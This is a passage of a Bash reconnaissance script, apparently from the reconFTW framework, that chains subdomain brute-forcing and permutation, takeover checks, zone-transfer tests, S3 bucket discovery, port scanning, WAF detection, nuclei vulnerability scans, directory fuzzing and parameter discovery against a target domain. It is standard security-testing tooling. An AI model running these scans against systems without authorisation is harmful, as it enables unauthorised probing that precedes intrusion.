			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function sub_permut(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SUBPERMUTE" = true ]; then
		start_subfunc "Running : Permutations Subdomain Enumeration"
		if [ "$DEEP" = true ]; then
			axiom-scan subdomains/subdomains.txt -m dnscewl -o .tmp/DNScewl1_.txt &>>"$LOGFILE" && cat .tmp/DNScewl1_.txt | grep ".$domain$" > .tmp/DNScewl1.txt
			axiom-scan .tmp/DNScewl1.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute1_tmp.txt &>>"$LOGFILE"
			cat .tmp/permute1_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute1.txt
			axiom-scan .tmp/permute1.txt -m dnscewl -o .tmp/DNScewl2_.txt &>>"$LOGFILE" && cat .tmp/DNScewl2_.txt 2>>"$LOGFILE" | grep ".$domain$" > .tmp/DNScewl2.txt
			axiom-scan .tmp/DNScewl2.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute2_tmp.txt &>>"$LOGFILE"
			cat .tmp/permute2_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute2.txt
			cat .tmp/permute1.txt .tmp/permute2.txt 2>>"$LOGFILE" | anew -q .tmp/permute_subs.txt
		else
			if [[ $(cat .tmp/subs_no_resolved.txt | wc -l) -le 100 ]]; then
				axiom-scan .tmp/subs_no_resolved.txt -m dnscewl -o .tmp/DNScewl1_.txt &>>"$LOGFILE" && cat .tmp/DNScewl1_.txt | grep ".$domain$" > .tmp/DNScewl1.txt
				axiom-scan .tmp/DNScewl1.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute1_tmp.txt &>>"$LOGFILE"
				cat .tmp/permute1_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute1.txt
				axiom-scan .tmp/permute1.txt -m dnscewl -o .tmp/DNScewl2_.txt &>>"$LOGFILE" && cat .tmp/DNScewl2_.txt 2>>"$LOGFILE" | grep ".$domain$" > .tmp/DNScewl2.txt
				axiom-scan .tmp/DNScewl2.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute2_tmp.txt &>>"$LOGFILE"
				cat .tmp/permute2_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute2.txt
				cat .tmp/permute1.txt .tmp/permute2.txt 2>>"$LOGFILE" | anew -q .tmp/permute_subs.txt
			elif [[ $(cat .tmp/subs_no_resolved.txt | wc -l) -le 200 ]]; then
				axiom-scan .tmp/subs_no_resolved.txt -m dnscewl -o .tmp/DNScewl1_.txt &>>"$LOGFILE" && cat .tmp/DNScewl1_.txt | grep ".$domain$" > .tmp/DNScewl1.txt
				axiom-scan .tmp/DNScewl1.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute_tmp.txt &>>"$LOGFILE"
				cat .tmp/permute_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute_subs.txt
			else
				if [[ $(cat subdomains/subdomains.txt | wc -l) -le 100 ]]; then
					axiom-scan subdomains/subdomains.txt -m dnscewl -o .tmp/DNScewl1_.txt &>>"$LOGFILE" && cat .tmp/DNScewl1_.txt | grep ".$domain$" > .tmp/DNScewl1.txt
					axiom-scan .tmp/DNScewl1.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute1_tmp.txt &>>"$LOGFILE"
					cat .tmp/permute1_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute1.txt
					axiom-scan .tmp/permute1.txt -m dnscewl -o .tmp/DNScewl2_.txt &>>"$LOGFILE" && cat .tmp/DNScewl2_.txt 2>>"$LOGFILE" | grep ".$domain$" > .tmp/DNScewl2.txt
					axiom-scan .tmp/DNScewl2.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute2_tmp.txt &>>"$LOGFILE"
					cat .tmp/permute2_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute2.txt
					cat .tmp/permute1.txt .tmp/permute2.txt 2>>"$LOGFILE" | anew -q .tmp/permute_subs.txt
				elif [[ $(cat subdomains/subdomains.txt | wc -l) -le 200 ]]; then
					axiom-scan subdomains/subdomains.txt -m dnscewl -o .tmp/DNScewl1_.txt &>>"$LOGFILE" && cat .tmp/DNScewl1_.txt | grep ".$domain$" > .tmp/DNScewl1.txt
					axiom-scan .tmp/DNScewl1.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute_tmp.txt &>>"$LOGFILE"
					cat .tmp/permute_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute_subs.txt
				else
					printf "\n${bred} Skipping Permutations: Too Much Subdomains${reset}\n\n"
				fi
			fi
		fi
		if [ -f ".tmp/permute_subs.txt" ]; then
			deleteOutScoped $outOfScope_file .tmp/permute_subs.txt
			NUMOFLINES=$(cat .tmp/permute_subs.txt 2>>"$LOGFILE" | grep ".$domain$" | anew subdomains/subdomains.txt | wc -l)
		else
			NUMOFLINES=0
		fi
		end_subfunc "${NUMOFLINES} new subs (permutations)" ${FUNCNAME[0]}
	else
		if [ "$SUBPERMUTE" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function sub_recursive(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SUBRECURSIVE" = true ]; then
		if [[ $(cat .tmp/subs_no_resolved.txt | wc -l) -le 1000 ]]; then
			start_subfunc "Running : Subdomains recursive search"
			echo "" > .tmp/brute_recursive_wordlist.txt
			for sub in $(cat subdomains/subdomains.txt); do
				sed "s/$/.$sub/" $subs_wordlist >> .tmp/brute_recursive_wordlist.txt
			done
			axiom-scan .tmp/brute_recursive_wordlist.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/brute_recursive_result.txt &>>"$LOGFILE"
			cat .tmp/brute_recursive_result.txt | anew -q .tmp/brute_recursive.txt
			axiom-scan .tmp/brute_recursive.txt -m dnscewl -o .tmp/DNScewl1_recursive_.txt &>>"$LOGFILE" && cat .tmp/DNScewl1_recursive_.txt 2>>"$LOGFILE" | grep ".$domain$" > .tmp/DNScewl1_recursive.txt
			axiom-scan .tmp/DNScewl1_recursive.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute1_recursive_tmp.txt &>>"$LOGFILE"
			cat .tmp/permute1_recursive_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute1_recursive.txt
			axiom-scan .tmp/permute1_recursive.txt -m dnscewl -o .tmp/DNScewl2_recursive_.txt &>>"$LOGFILE" && cat .tmp/DNScewl2_recursive_.txt 2>>"$LOGFILE" | grep ".$domain$" > .tmp/DNScewl2_recursive.txt
			axiom-scan .tmp/DNScewl2_recursive.txt -m puredns-resolve -r /home/op/lists/resolvers.txt -o .tmp/permute2_recursive_tmp.txt &>>"$LOGFILE"
			cat .tmp/permute1_recursive.txt .tmp/permute2_recursive_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/permute_recursive.txt
			NUMOFLINES=$(cat .tmp/permute_recursive.txt .tmp/brute_recursive.txt 2>>"$LOGFILE" | grep "\.$domain$\|^$domain$" | anew subdomains/subdomains.txt | wc -l)
			end_subfunc "${NUMOFLINES} new subs (recursive)" ${FUNCNAME[0]}
		else
			notification "Skipping Recursive: Too Many Subdomains" warn
		fi
	else
		if [ "$SUBRECURSIVE" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function subtakeover(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$SUBTAKEOVER" = true ]; then
		start_func "Looking for possible subdomain takeover"
		touch .tmp/tko.txt
		axiom-scan webs/webs.txt -m nuclei -w /home/op/recon/nuclei/takeovers/ -o .tmp/tko.txt &>>"$LOGFILE"
		NUMOFLINES=$(cat .tmp/tko.txt 2>>"$LOGFILE" | anew webs/takeover.txt | wc -l)
		if [ "$NUMOFLINES" -gt 0 ]; then
			notification "${NUMOFLINES} new possible takeovers found" info
		fi
		end_func "Results are saved in $domain/webs/takeover.txt" ${FUNCNAME[0]}
	else
		if [ "$SUBTAKEOVER" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function zonetransfer(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$ZONETRANSFER" = true ]; then
		start_func "Zone transfer check"
		python3 $tools/dnsrecon/dnsrecon.py -d $domain -a -j subdomains/zonetransfer.json &>>"$LOGFILE"
		if [ -s "subdomains/zonetransfer.json" ]; then
			if grep -q "\"zone_transfer\"\: \"success\"" subdomains/zonetransfer.json ; then notification "Zone transfer found on ${domain}!" info; fi
		fi
		end_func "Results are saved in $domain/subdomains/zonetransfer.txt" ${FUNCNAME[0]}
	else
		if [ "$ZONETRANSFER" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function s3buckets(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$S3BUCKETS" = true ]; then
		start_func "AWS S3 buckets search"
		s3scanner scan --buckets-file subdomains/subdomains.txt 2>>"$LOGFILE" | grep -iv "not_exist" | anew -q .tmp/s3buckets.txt
		#axiom-scan subdomains/subdomains.txt -m s3scanner -o .tmp/s3buckets.txt &>>"$LOGFILE"
		NUMOFLINES=$(cat .tmp/s3buckets.txt 2>>"$LOGFILE" | anew subdomains/s3buckets.txt | wc -l)
		if [ "$NUMOFLINES" -gt 0 ]; then
			notification "${NUMOFLINES} new S3 buckets found" info
		fi
		end_func "Results are saved in subdomains/s3buckets.txt" ${FUNCNAME[0]}
	else
		if [ "$S3BUCKETS" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

###############################################################################################################
########################################### WEB DETECTION #####################################################
###############################################################################################################

function webprobe_simple(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$WEBPROBESIMPLE" = true ]; then
		start_subfunc "Running : Http probing $domain"
		if [ -s ".tmp/probed_tmp_scrap.txt" ]; then
			mv .tmp/probed_tmp_scrap.txt .tmp/probed_tmp.txt
		else
			axiom-scan subdomains/subdomains.txt -m httpx -follow-host-redirects -random-agent -threads $HTTPX_THREADS -status-code -timeout $HTTPX_TIMEOUT -silent -retries 2 -no-color -o .tmp/probed_tmp_.txt &>>"$LOGFILE" && cat .tmp/probed_tmp_.txt | cut -d ' ' -f1 | grep ".$domain$" | anew -q .tmp/probed_tmp.txt
		fi
		if [ -s ".tmp/probed_tmp.txt" ]; then
			deleteOutScoped $outOfScope_file .tmp/probed_tmp.txt
			NUMOFLINES=$(cat .tmp/probed_tmp.txt 2>>"$LOGFILE" | anew webs/webs.txt | wc -l)
			end_subfunc "${NUMOFLINES} new websites resolved" ${FUNCNAME[0]}
			if [ "$PROXY" = true ] && [ -n "$proxy_url" ] && [[ $(cat webs/webs.txt| wc -l) -le 1500 ]]; then
				notification "Sending websites to proxy" info
				ffuf -mc all -w webs/webs.txt -u FUZZ -replay-proxy $proxy_url &>>"$LOGFILE"
			fi
		else
			end_subfunc "No new websites to probe" ${FUNCNAME[0]}
		fi
	else
		if [ "$WEBPROBESIMPLE" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function webprobe_full(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$WEBPROBEFULL" = true ]; then
		start_func "Http probing non standard ports"
		axiom-scan subdomains/subdomains.txt -m naabu -p $UNCOMMON_PORTS_WEB -o .tmp/nmap_uncommonweb.txt &>>"$LOGFILE" && uncommon_ports_checked=$(cat .tmp/nmap_uncommonweb.txt | cut -d ':' -f2 | sort -u | sed -e 'H;${x;s/\n/,/g;s/^,//;p;};d')
		if [ -n "$uncommon_ports_checked" ]; then
			axiom-scan subdomains/subdomains.txt -m httpx -ports $uncommon_ports_checked -follow-host-redirects -random-agent -status-code -threads $HTTPX_UNCOMMONPORTS_THREADS -timeout 10 -silent -retries 2 -no-color -o .tmp/probed_uncommon_ports_tmp_.txt &>>"$LOGFILE" && cat .tmp/probed_uncommon_ports_tmp_.txt | cut -d ' ' -f1 | grep ".$domain$" | anew -q .tmp/probed_uncommon_ports_tmp.txt
		fi
		NUMOFLINES=$(cat .tmp/probed_uncommon_ports_tmp.txt 2>>"$LOGFILE" | anew webs/webs_uncommon_ports.txt | wc -l)
		notification "Uncommon web ports: ${NUMOFLINES} new websites" good
		cat webs/webs_uncommon_ports.txt 2>>"$LOGFILE"
		end_func "Results are saved in $domain/webs/webs_uncommon_ports.txt" ${FUNCNAME[0]}
		if [ "$PROXY" = true ] && [ -n "$proxy_url" ] && [[ $(cat webs/webs_uncommon_ports.txt| wc -l) -le 1500 ]]; then
			notification "Sending websites uncommon ports to proxy" info
			ffuf -mc all -w webs/webs_uncommon_ports.txt -u FUZZ -replay-proxy $proxy_url &>>"$LOGFILE"
		fi
	else
		if [ "$WEBPROBEFULL" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function screenshot(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$WEBSCREENSHOT" = true ]; then
		start_func "Web Screenshots"
		cat webs/webs.txt webs/webs_uncommon_ports.txt 2>>"$LOGFILE" | anew -q .tmp/webs_screenshots.txt
		axiom-scan .tmp/webs_screenshots.txt -m "$AXIOM_SCREENSHOT_MODULE" -o screenshots &>>"$LOGFILE"
		end_func "Results are saved in $domain/screenshots folder" ${FUNCNAME[0]}
	else
		if [ "$WEBSCREENSHOT" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

###############################################################################################################
############################################# HOST SCAN #######################################################
###############################################################################################################

function favicon(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$FAVICON" = true ]; then
		start_func "Favicon Ip Lookup"
		cd "$tools/fav-up" || { echo "Failed to cd to $dir in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		python3 favUp.py -w "$domain" -sc -o favicontest.json &>>"$LOGFILE"
		if [ -f "favicontest.json" ]; then
			cat favicontest.json | jq -r '.found_ips' 2>>"$LOGFILE" | grep -v "not-found" > favicontest.txt
			sed -i "s/|/\n/g" favicontest.txt
			cat favicontest.txt 2>>"$LOGFILE"
			mv favicontest.txt $dir/hosts/favicontest.txt 2>>"$LOGFILE"
			rm favicontest.json 2>>"$LOGFILE"
		fi
		cd "$dir" || { echo "Failed to cd to $dir in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		end_func "Results are saved in hosts/favicontest.txt" ${FUNCNAME[0]}
	else
		if [ "$FAVICON" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function portscan(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$PORTSCANNER" = true ]; then
		start_func "Port scan"
		for sub in $(cat subdomains/subdomains.txt); do
			echo "$sub $(dig +short a $sub | tail -n1)" | anew -q .tmp/subs_ips.txt
		done
		awk '{ print $2 " " $1}' .tmp/subs_ips.txt | sort -k2 -n | anew -q hosts/subs_ips_vhosts.txt
		cat hosts/subs_ips_vhosts.txt 2>>"$LOGFILE" | cut -d ' ' -f1 | grep -Eiv "^(127|10|169\.154|172\.1[6789]|172\.2[0-9]|172\.3[01]|192\.168)\." | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | anew -q hosts/ips.txt
		axiom-scan webs/webs.txt -m cf-check -o .tmp/ips_nowaf_.txt &>>"$LOGFILE" && cat .tmp/ips_nowaf_.txt | grep -Eiv "^(127|10|169\.154|172\.1[6789]|172\.2[0-9]|172\.3[01]|192\.168)\." | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | anew -q .tmp/ips_nowaf.txt
		printf "${bblue}\n Resolved IP addresses (No WAF) ${reset}\n\n";
		cat .tmp/ips_nowaf.txt 2>>"$LOGFILE" | sort
		printf "${bblue}\n Scanning ports... ${reset}\n\n";
		if [ "$PORTSCAN_PASSIVE" = true ] && [ ! -f "hosts/portscan_passive.txt" ]; then
			for sub in $(cat hosts/ips.txt); do
				shodan host $sub 2>/dev/null >> hosts/portscan_passive.txt && echo -e "\n\n#######################################################################\n\n" >> hosts/portscan_passive.txt
			done
		fi
		if [ "$PORTSCAN_ACTIVE" = true ]; then
			axiom-scan .tmp/ips_nowaf.txt -m nmapx --top-ports 1000 -sV -n -Pn --max-retries 2 -o hosts/portscan_active.txt &>>"$LOGFILE"
		fi
		end_func "Results are saved in hosts/portscan_[passive|active].txt" ${FUNCNAME[0]}
	else
		if [ "$PORTSCANNER" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function cloudprovider(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$CLOUD_IP" = true ]; then
		start_func "Cloud provider check"
		cd "$tools/ip2provider" || { echo "Failed to cd directory in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		cat $dir/hosts/ips.txt | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | ./ip2provider.py | anew -q $dir/hosts/cloud_providers.txt &>>"$LOGFILE"
		cd "$dir" || { echo "Failed to cd directory in ${FUNCNAME[0]} @ line ${LINENO}"; exit 1; }
		end_func "Results are saved in hosts/cloud_providers.txt" ${FUNCNAME[0]}
	else
		if [ "$CLOUD_IP" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

###############################################################################################################
############################################# WEB SCAN ########################################################
###############################################################################################################

function waf_checks(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$WAF_DETECTION" = true ]; then
		start_func "Website's WAF detection"
		if [ -s "./webs/webs.txt" ]; then
			axiom-scan webs/webs.txt -m wafw00f -o .tmp/wafs.txt &>>"$LOGFILE"
			if [ -f ".tmp/wafs.txt" ]; then
				cat .tmp/wafs.txt | sed -e 's/^[ \t]*//' -e 's/ \+ /\t/g' -e '/(None)/d' | tr -s "\t" ";" > webs/webs_wafs.txt
				NUMOFLINES=$(cat webs/webs_wafs.txt 2>>"$LOGFILE" | wc -l)
				notification "${NUMOFLINES} websites protected by waf" info
				end_func "Results are saved in $domain/webs/webs_wafs.txt" ${FUNCNAME[0]}
			else
				end_func "No results found" ${FUNCNAME[0]}
			fi
		else
			end_func "No websites to scan" ${FUNCNAME[0]}
		fi
	else
		if [ "$WAF" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function nuclei_check(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$NUCLEICHECK" = true ]; then
		start_func "Templates based web scanner"
		nuclei -update-templates &>>"$LOGFILE"
		mkdir -p nuclei_output
		printf "${yellow}\n Running : Nuclei Info${reset}\n\n"
		axiom-scan webs/webs.txt -m nuclei -severity info -r /home/op/lists/resolvers_trusted.txt -o nuclei_output/info.txt &>>"$LOGFILE"
		printf "${yellow}\n\n Running : Nuclei Low${reset}\n\n"
		axiom-scan webs/webs.txt -m nuclei -severity low -r /home/op/lists/resolvers_trusted.txt -o nuclei_output/low.txt &>>"$LOGFILE"
		printf "${yellow}\n\n Running : Nuclei Medium${reset}\n\n"
		axiom-scan webs/webs.txt -m nuclei -severity medium -r /home/op/lists/resolvers_trusted.txt -o nuclei_output/medium.txt &>>"$LOGFILE"
		printf "${yellow}\n\n Running : Nuclei High${reset}\n\n"
		axiom-scan webs/webs.txt -m nuclei -severity high -r /home/op/lists/resolvers_trusted.txt -o nuclei_output/high.txt &>>"$LOGFILE"
		printf "${yellow}\n\n Running : Nuclei Critical${reset}\n\n"
		axiom-scan webs/webs.txt -m nuclei -severity critical -r /home/op/lists/resolvers_trusted.txt -o nuclei_output/critical.txt &>>"$LOGFILE"
		printf "\n\n"
		end_func "Results are saved in $domain/nuclei_output folder" ${FUNCNAME[0]}
	else
		if [ "$NUCLEICHECK" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function fuzz(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$FUZZ" = true ]; then
		start_func "Web directory fuzzing"
		if [ -s "./webs/webs.txt" ]; then
			mkdir -p $dir/fuzzing
			axiom-scan webs/webs.txt -m ffuf -H \'\"${HEADER}\"\' -wL $fuzz_wordlist -mc all -fc 404 -sf -s -maxtime $FFUF_MAXTIME -o $dir/fuzzing/ffuf-content.csv &>>"$LOGFILE"
			grep -v "FUZZ,url,redirectlocation" $dir/fuzzing/ffuf-content.csv | awk -F "," '{print $2" "$5" "$6}' | sort > $dir/fuzzing/ffuf-content.tmp
			for sub in $(cat webs/webs.txt); do
				sub_out=$(echo $sub | sed -e 's|^[^/]*//||' -e 's|/.*$||')
				grep "$sub" $dir/fuzzing/ffuf-content.tmp | awk '{print $2" "$3" "$1}' > $dir/fuzzing/${sub_out}.txt
			done
			rm -f $dir/fuzzing/ffuf-content.tmp
			end_func "Results are saved in $domain/fuzzing/*subdomain*.txt" ${FUNCNAME[0]}
		else
			end_func "No $domain/web/webs.txts file found, fuzzing skipped " ${FUNCNAME[0]}
		fi
	else
		if [ "$FUZZ" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function cms_scanner(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$CMS_SCANNER" = true ]; then
		start_func "CMS Scanner"
		mkdir -p $dir/cms && rm -rf $dir/cms/*
		if [ -s "./webs/webs.txt" ]; then
			tr '\n' ',' < webs/webs.txt > .tmp/cms.txt
			timeout -k 30 $CMSSCAN_TIMEOUT python3 $tools/CMSeeK/cmseek.py -l .tmp/cms.txt --batch -r &>>"$LOGFILE"
			exit_status=$?
			if [[ $exit_status -eq 125 ]]; then
				echo "TIMEOUT cmseek.py - investigate manually for $dir" &>>"$LOGFILE"
				end_func "TIMEOUT cmseek.py - investigate manually for $dir" ${FUNCNAME[0]}
				return
			elif [[ $exit_status -ne 0 ]]; then
				echo "ERROR cmseek.py - investigate manually for $dir" &>>"$LOGFILE"
				end_func "ERROR cmseek.py - investigate manually for $dir" ${FUNCNAME[0]}
				return
			fi	# otherwise Assume we have a successfully exited cmseek
			for sub in $(cat webs/webs.txt); do
				sub_out=$(echo $sub | sed -e 's|^[^/]*//||' -e 's|/.*$||')
				cms_id=$(cat $tools/CMSeeK/Result/${sub_out}/cms.json 2>>"$LOGFILE" | jq -r '.cms_id')
				if [ -z "$cms_id" ]; then
					rm -rf $tools/CMSeeK/Result/${sub_out}
				else
					mv -f $tools/CMSeeK/Result/${sub_out} $dir/cms/
				fi
			done
			end_func "Results are saved in $domain/cms/*subdomain* folder" ${FUNCNAME[0]}
		else
			end_func "No $domain/web/webs.txts file found, cms scanner skipped" ${FUNCNAME[0]}
		fi
	else
		if [ "$CMS_SCANNER" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function params(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$PARAMS" = true ]; then
		start_func "Parameter Discovery"
		printf "${yellow}\n\n Running : Searching params with paramspider${reset}\n"
		cat webs/webs.txt | sed -r "s/https?:\/\///" | anew -q .tmp/probed_nohttp.txt
		axiom-scan .tmp/probed_nohttp.txt -m paramspider -l high -q --exclude eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,pdf,svg,txt,js -o output_paramspider &>>"$LOGFILE"
		cat output_paramspider/*.txt 2>>"$LOGFILE" | anew -q .tmp/param_tmp.txt
		sed '/^FUZZ/d' -i .tmp/param_tmp.txt
		rm -rf output_paramspider/ 2>>"$LOGFILE"
		if [ "$DEEP" = true ]; then
			printf "${yellow}\n\n Running : Checking ${domain} with Arjun${reset}\n"
			axiom-scan .tmp/param_tmp.txt -m arjun -t $ARJUN_THREADS -o webs/param.txt &>>"$LOGFILE"
		else
			if [[ $(cat .tmp/param_tmp.txt | wc -l) -le 50 ]]; then
				printf "${yellow}\n\n Running : Checking ${domain} with Arjun${reset}\n"
				axiom-scan .tmp/param_tmp.txt -m arjun -t $ARJUN_THREADS -o webs/param.txt &>>"$LOGFILE"
			else
				cp .tmp/param_tmp.txt webs/param.txt
			fi
		fi
		end_func "Results are saved in $domain/webs/param.txt" ${FUNCNAME[0]}
	else
		if [ "$PARAMS" = false ]; then
			printf "\n${yellow} ${FUNCNAME[0]} skipped in this mode or defined in reconftw.cfg ${reset}\n"
		else
			printf "${yellow} ${FUNCNAME[0]} is already processed, to force executing ${FUNCNAME[0]} delete $called_fn_dir/.${FUNCNAME[0]} ${reset}\n\n"
		fi
	fi
}

function urlchecks(){
	if { [ ! -f "$called_fn_dir/.${FUNCNAME[0]}" ] || [ "$DIFF" = true ]; } && [ "$URL_CHECK" = true ]; then
		start_func "URL Extraction"
		mkdir -p js
		axiom-scan webs/webs.txt -m waybackurls -o .tmp/url_extract_way_tmp.txt &>>"$LOGFILE" && cat .tmp/url_extract_way_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/url_extract_tmp.txt
		axiom-scan webs/webs.txt -m gau -o .tmp/url_extract_gau_tmp.txt &>>"$LOGFILE" && cat .tmp/url_extract_gau_tmp.txt 2>>"$LOGFILE" | anew -q .tmp/url_extract_tmp.txt
		diff_webs=$(diff <(sort -u .tmp/probed_tmp.txt) <(sort -u webs/webs.txt) | wc -l)
		if [ $diff_webs != "0" ] || [ ! -s ".tmp/gospider.txt" ]; then
			if [ "$DEEP" = true ]; then
				axiom-scan .tmp/probed_tmp_scrap.txt -m gospider --js -d 3 --sitemap --robots -w -r -o .tmp/gospider &>>"$LOGFILE"
			else
				axiom-scan .tmp/probed_tmp_scrap.txt -m gospider --js -d 2 --sitemap --robots -w -r -o .tmp/gospider &>>"$LOGFILE"
			fi
